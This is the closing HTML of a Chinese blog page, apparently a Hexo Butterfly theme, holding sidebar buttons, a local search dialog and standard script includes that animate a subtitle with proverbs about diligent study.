id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。","勤能补拙,天道酬勤"],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = '应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>